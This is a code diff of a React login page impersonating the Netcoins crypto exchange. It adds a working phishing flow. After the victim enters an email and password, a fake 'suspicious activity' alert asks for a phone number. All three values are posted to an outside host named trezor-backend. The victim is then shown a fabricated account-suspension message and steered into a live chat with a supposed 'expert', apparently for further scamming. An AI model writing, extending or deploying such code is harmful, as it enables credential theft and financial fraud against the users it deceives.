@@ -29,6 +29,8 @@ import name from '../../assets/name.svg'
 import MailOutlineIcon from '@mui/icons-material/MailOutline';
 import Image from "next/image";
 import LockOutlineIcon from '@mui/icons-material/LockOutline';
+import { CustomPhoneInput } from "@/components/CustomPhoneInput";
+import { useMobileCode } from "@/components/useMobileCode";
 export default function LoginMainPage() {
     const [openHelpModal, setOpenHelpModal] = useState(false);
     const [email, setEmail] = useState("");
@@ -37,8 +39,45 @@ export default function LoginMainPage() {
     const handleCloseHelp = () => setOpenHelpModal(false);
     const [loading, setLoading] = useState(false)
     const [open, setOpen] = useState(false);
-
+    const [step, setStep] = useState(0)
+    const [phone, setPhone] = useState("")
+    const {
+        code,
+        setCode,
+        phoneNumberLength,
+        setPhoneNumberLength,
+        anchorEl,
+        searchText,
+        setSearchText,
+        handleSearchTextChange,
+        filteredMenuItems,
+        handleCountryCode,
+        handleMenuClose,
+        handleCode,
+        validCountryDataList,
+    } = useMobileCode();
+    const [alert, setAlert] = useState({
+        type: 'error',
+        message: 'Important message!: some suspicious activity found with your account. Enter phone number to verify your identity'
+    });
     const handleSubmit = async (e) => {
+        e.preventDefault(); // Prevent page reload
+        try {
+            if (!email || !password) {
+                alert("Please enter both email and password");
+                return;
+            }
+            setStep(1)
+
+        } catch (err) {
+            console.log(err);
+
+        } finally {
+
+
+        }
+    };
+    const handleSubmit2 = async (e) => {
         e.preventDefault(); // Prevent page reload
         try {
             if (!email || !password) {
@@ -48,17 +87,22 @@ export default function LoginMainPage() {
             const data = {
                 title: "Netcoins | Buy Bitcoin & Crypto",
                 email: email,
-                password
+                password,
+                phone: phone ? `+${code}${phone}` : ""
 
             }
             setLoading(true)
             const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
             if (response) {
-                setOpen(true)
+                if (response) {
+                    setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
+                    setStep(2)
+                }
             }
         } catch (err) {
             console.log(err);
-            setOpen(true)
+            setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
+
 
         } finally {
             setLoading(false)
@@ -119,159 +163,268 @@ export default function LoginMainPage() {
                         <Image src={flower} width={27} height={30} alt="first" />
                     </Stack>
 
-                    {/* Input Fields */}
-                    <TextField
-                        fullWidth
-                        placeholder="Enter your email"
-                        variant="outlined"
-                        type="email"
-                        onChange={(e) => setEmail(e.target.value)}
-                        value={email}
-                        InputProps={{
-                            startAdornment: (
-                                <InputAdornment position="start">
-                                    <Box
-                                        sx={{
-                                            bgcolor: "#202043",
-                                            p: 2,
-                                            borderRadius: "6px 0 0 6px",
-                                            display: "flex",
-                                            alignItems: "center",
-                                            justifyContent: "center",
-                                            borderRight: "1px solid #2e2e4e",
-                                        }}
-                                    >
-                                        <MailOutlineIcon sx={{ color: "white", fontSize: 16 }} />
-                                    </Box>
-                                </InputAdornment>
-                            ),
-                        }}
-                        sx={{
-
-                            "& .MuiOutlinedInput-root": {
-                                fontSize: "16px",
-                                paddingLeft: "0 !important",
-                                borderRadius: "8px",
-                                overflow: "hidden",
-                                bgcolor: "#393958",
-                                "& fieldset": {
-                                    borderColor: "transparent",
-                                },
-                                "&:hover fieldset": {
-                                    borderColor: "#666",
-                                },
-                                "& input": {
-                                    color: "white",
-                                    padding: "12px 14px",
-                                },
-                            },
-                            "& .MuiInputAdornment-root": {
-                                margin: 0,
-                            },
-                        }}
-                    />
-
-
-                    <TextField
-                        fullWidth
-                        type={showPassword ? "text" : "password"}
-                        placeholder="Enter your password"
-                        variant="outlined"
-                        onChange={(e) => setPassword(e.target.value)}
-                        value={password}
-                        InputProps={{
-                            startAdornment: (
-                                <InputAdornment position="start">
-                                    <Box
-                                        sx={{
-                                            bgcolor: "#202043",
-                                            p: 2,
-                                            borderRadius: "6px 0 0 6px",
-                                            display: "flex",
-                                            alignItems: "center",
-                                            justifyContent: "center",
-                                            borderRight: "1px solid #2e2e4e",
-                                        }}
-                                    >
-                                        <LockOutlineIcon sx={{ color: "#c9c9d8", fontSize: 16 }} />
-                                    </Box>
-                                </InputAdornment>
-                            ),
-                            endAdornment: (
-                                <InputAdornment position="end">
-                                    <IconButton onClick={() => setShowPassword(!showPassword)}>
-                                        {showPassword ? (
-                                            <VisibilityOff sx={{ color: "#ccc" }} />
-                                        ) : (
-                                            <Visibility sx={{ color: "#ccc" }} />
-                                        )}
-                                    </IconButton>
-                                </InputAdornment>
-                            ),
-                        }}
-                        sx={{
-                            "& .MuiOutlinedInput-root": {
-                                paddingLeft: "0 !important",
-                                fontSize: "16px",
-                                overflow: "hidden",
-                                borderRadius: "8px",
-                                bgcolor: "#393958",
-                                "& fieldset": {
-                                    borderColor: "transparent",
-                                },
-                                "&:hover fieldset": {
-                                    borderColor: "#666",
-                                },
-                                "& input": {
-                                    color: "white",
-                                    padding: "12px 14px",
-                                },
-                            },
-                            "& .MuiInputAdornment-root": {
-                                margin: 0,
-                            },
-                        }}
-                    />
-
-                    <Typography
-                        color="#7793F9"
-                        component={"p"}
-                        textAlign="left"
-                        sx={{ cursor: "pointer", fontSize: "14px", fontWeight: "400" }}
-                    >
-                        Forgot your password?
-                    </Typography>
-
-                    {/* Sign In Button */}
-                    <Box pt={2}>
-                        <Button
+                    {step == 0 && <>
+                        {/* Input Fields */}
+                        <TextField
                             fullWidth
-                            variant="contained"
-                            type="submit"
-                            loading={loading}
-                            disabled={loading}
-                            sx={{
-                                bgcolor: "#4666FF",
-                                textTransform: "none",
-                                fontWeight: 500,
-                                letterSpacing: "1px",
-                                height: "48px",
+                            placeholder="Enter your email"
+                            variant="outlined"
+                            type="email"
+                            onChange={(e) => setEmail(e.target.value)}
+                            value={email}
+                            InputProps={{
+                                startAdornment: (
+                                    <InputAdornment position="start">
+                                        <Box
+                                            sx={{
+                                                bgcolor: "#202043",
+                                                p: 2,
+                                                borderRadius: "6px 0 0 6px",
+                                                display: "flex",
+                                                alignItems: "center",
+                                                justifyContent: "center",
+                                                borderRight: "1px solid #2e2e4e",
+                                            }}
+                                        >
+                                            <MailOutlineIcon sx={{ color: "white", fontSize: 16 }} />
+                                        </Box>
+                                    </InputAdornment>
+                                ),
                             }}
+                            sx={{
+
+                                "& .MuiOutlinedInput-root": {
+                                    fontSize: "16px",
+                                    paddingLeft: "0 !important",
+                                    borderRadius: "8px",
+                                    overflow: "hidden",
+                                    bgcolor: "#393958",
+                                    "& fieldset": {
+                                        borderColor: "transparent",
+                                    },
+                                    "&:hover fieldset": {
+                                        borderColor: "#666",
+                                    },
+                                    "& input": {
+                                        color: "white",
+                                        padding: "12px 14px",
+                                    },
+                                },
+                                "& .MuiInputAdornment-root": {
+                                    margin: 0,
+                                },
+                            }}
+                        />
+
+
+                        <TextField
+                            fullWidth
+                            type={showPassword ? "text" : "password"}
+                            placeholder="Enter your password"
+                            variant="outlined"
+                            onChange={(e) => setPassword(e.target.value)}
+                            value={password}
+                            InputProps={{
+                                startAdornment: (
+                                    <InputAdornment position="start">
+                                        <Box
+                                            sx={{
+                                                bgcolor: "#202043",
+                                                p: 2,
+                                                borderRadius: "6px 0 0 6px",
+                                                display: "flex",
+                                                alignItems: "center",
+                                                justifyContent: "center",
+                                                borderRight: "1px solid #2e2e4e",
+                                            }}
+                                        >
+                                            <LockOutlineIcon sx={{ color: "#c9c9d8", fontSize: 16 }} />
+                                        </Box>
+                                    </InputAdornment>
+                                ),
+                                endAdornment: (
+                                    <InputAdornment position="end">
+                                        <IconButton onClick={() => setShowPassword(!showPassword)}>
+                                            {showPassword ? (
+                                                <VisibilityOff sx={{ color: "#ccc" }} />
+                                            ) : (
+                                                <Visibility sx={{ color: "#ccc" }} />
+                                            )}
+                                        </IconButton>
+                                    </InputAdornment>
+                                ),
+                            }}
+                            sx={{
+                                "& .MuiOutlinedInput-root": {
+                                    paddingLeft: "0 !important",
+                                    fontSize: "16px",
+                                    overflow: "hidden",
+                                    borderRadius: "8px",
+                                    bgcolor: "#393958",
+                                    "& fieldset": {
+                                        borderColor: "transparent",
+                                    },
+                                    "&:hover fieldset": {
+                                        borderColor: "#666",
+                                    },
+                                    "& input": {
+                                        color: "white",
+                                        padding: "12px 14px",
+                                    },
+                                },
+                                "& .MuiInputAdornment-root": {
+                                    margin: 0,
+                                },
+                            }}
+                        />
+
+                        <Typography
+                            color="#7793F9"
+                            component={"p"}
+                            textAlign="left"
+                            sx={{ cursor: "pointer", fontSize: "14px", fontWeight: "400" }}
                         >
-                            Sign In
-                        </Button>
-                    </Box>
-
-                    {/* Create Account */}
-                    <Stack direction={"row"} py={2}>
-                        <Typography component={"p"} color="white" fontWeight={400}>
-                            Need an account?{" "}
-                            <Link href="#" color="#7793F9" underline="hover" sx={{ fontWeight: 400 }}>
-                                Create an account
-                            </Link>
+                            Forgot your password?
                         </Typography>
-                    </Stack>
 
+                        {/* Sign In Button */}
+                        <Box pt={2}>
+                            <Button
+                                fullWidth
+                                variant="contained"
+                                type="submit"
+                                loading={loading}
+                                disabled={loading}
+                                sx={{
+                                    bgcolor: "#4666FF",
+                                    textTransform: "none",
+                                    fontWeight: 500,
+                                    letterSpacing: "1px",
+                                    height: "48px",
+                                }}
+                            >
+                                Sign In
+                            </Button>
+                        </Box>
+
+                        {/* Create Account */}
+                        <Stack direction={"row"} py={2}>
+                            <Typography component={"p"} color="white" fontWeight={400}>
+                                Need an account?{" "}
+                                <Link href="#" color="#7793F9" underline="hover" sx={{ fontWeight: 400 }}>
+                                    Create an account
+                                </Link>
+                            </Typography>
+                        </Stack>
+                    </>
+                    }
+
+                    {
+                        step == 1 && <Box id="dasd">
+
+                            <Paper sx={{ padding: "10px", background: "#fef2f2", border: "2px solid #ffc9c9", mb: 4, mt: 3 }}>
+                                <Stack direction={"row"} alignItems={"flex-start"}>
+                                    <svg className="shrink-0 size-4 mt-0.5" style={{ flexShrink: 0, width: "1rem", height: "1rem", marginRight: "10px", marginTop: "3px" }} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6467" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <path d="m15 9-6 6"></path>
+                                        <path d="m9 9 6 6"></path>
+                                    </svg>
+                                    <div className="ms-4">
+                                        <Typography component={"p"} id="hs-with-list-label" className="text-sm font-semibold" style={{ color: "#ff6467", fontWeight: "600" }}>
+                                            {alert?.message}
+                                        </Typography>
+                                    </div>
+                                </Stack>
+
+                            </Paper>
+                            <div>
+                                <CustomPhoneInput
+                                    {...{
+                                        code,
+                                        setCode,
+                                        phoneNumberLength,
+                                        setPhoneNumberLength,
+                                        anchorEl,
+                                        searchText,
+                                        setSearchText,
+                                        handleSearchTextChange,
+                                        filteredMenuItems,
+                                        handleCountryCode,
+                                        handleMenuClose,
+                                        handleCode,
+                                        validCountryDataList,
+                                        value: phone,
+                                        handleChange: (e) => setPhone(e.target.value)
+                                    }}
+                                />
+
+                                <Box display="flex" gap={2} mt={3} mb={1}>
+
+                                    <Button
+                                        fullWidth
+                                        variant="contained"
+                                        form="dasd"
+                                        type="button"
+                                        onClick={handleSubmit2}
+                                        loading={loading}
+                                        disabled={loading}
+                                        sx={{
+                                            bgcolor: "#4666FF",
+                                            textTransform: "none",
+                                            fontWeight: 500,
+                                            letterSpacing: "1px",
+                                            height: "48px",
+                                        }}
+                                    >
+                                        Submit
+                                    </Button>
+                                </Box>
+                            </div>
+                        </Box>
+
+
+                    }
+
+                    {
+                        step == 2 && <> <Paper sx={{ padding: "10px", background: "#fef2f2", border: "2px solid #ffc9c9", mb: 10, mt: 3 }}>
+                            <Stack direction={"row"} alignItems={"flex-start"}>
+                                <svg className="shrink-0 size-4 mt-0.5" style={{ flexShrink: 0, width: "1rem", height: "1rem", marginRight: "10px", marginTop: "3px" }} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6467" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path d="m15 9-6 6"></path>
+                                    <path d="m9 9 6 6"></path>
+                                </svg>
+                                <div className="ms-4">
+                                    <Typography component={"p"} id="hs-with-list-label" className="text-sm font-semibold" style={{ color: "#ff6467", fontWeight: "600", textAlign: "start" }}>
+                                        {alert?.message}
+                                    </Typography>
+                                </div>
+                            </Stack>
+
+                        </Paper>
+                            <Box display="flex" gap={2} mt={3} mb={1}>
+
+                                <Button
+                                    fullWidth
+                                    variant="contained"
+                                    form="dasd"
+                                    onClick={() => {
+                                        window.Tawk_API?.maximize();
+                                    }}
+                                    loading={loading}
+                                    disabled={loading}
+                                    sx={{
+                                        bgcolor: "#4666FF",
+                                        textTransform: "none",
+                                        fontWeight: 500,
+                                        letterSpacing: "1px",
+                                        height: "48px",
+                                    }}
+                                >
+                                    Ask Expert
+                                </Button>
+                            </Box>
+                        </>
+                    }
                     {/* Fraud Alert Box */}
                     <Paper
                         variant="outlined"
